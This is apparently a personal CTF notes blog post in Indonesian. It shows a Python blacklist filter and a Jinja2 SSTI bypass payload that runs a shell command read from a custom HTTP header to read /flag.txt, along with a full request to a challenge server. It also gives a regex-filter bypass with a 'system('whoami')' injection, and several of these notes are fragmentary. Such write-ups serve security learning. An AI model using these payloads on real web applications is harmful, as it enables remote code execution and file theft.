---
title: "My CTF - Notes"
description: ""
pubDate: 2025-07-25 10:00
slug: "ctf-notes"
---

Ini adalah catetan saya yang dibuat secara personal berdasarkan pengalaman saya yang telah mengerjakan ctf selama ini

# Web

## SSTI

ada chall ini, diberikan program berikut:

```py
def security_filter(user_input):
 blacklist = ["%", "\\", "/", "\"", "'", "`", "|", " ", "[", "]", "+","init", "subprocess", "globlas", "config", "update", "mro", "subclasses",
"class", "base", "builtins", "cycler", "joiner", "namespace", "lipsum"]

 for word in blacklist:
    if word in user_input:
        return False
 return True
 ```

 payload untuk bypass : `{{url_for.__globals__.os.popen(request.headers.tel).read()}}`

 req header:
```
POST /search HTTP/1.1
Host: 103.160.212.3:1339
Content-Length: 70
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://103.160.212.3:1339
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Tel: cat /flag.txt   -> ini variabel baru
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/a
png,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://103.160.212.3:1339/

Accept-Encoding: gzip, deflate, br
Connection: keep-alive

query={{url_for.__globals__.os.popen(request.headers.tel).read()}}
```

---

The regex expression is `/^[0–9a-z ]+$/i`

- Only numbers and lowercase
- Key insensitive

![alt text](image.png)

![alt text](image-1.png)

---

The Regex filter bypass is:

`/(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>|({+.*}+)/`


```



{system('whoami')

}


```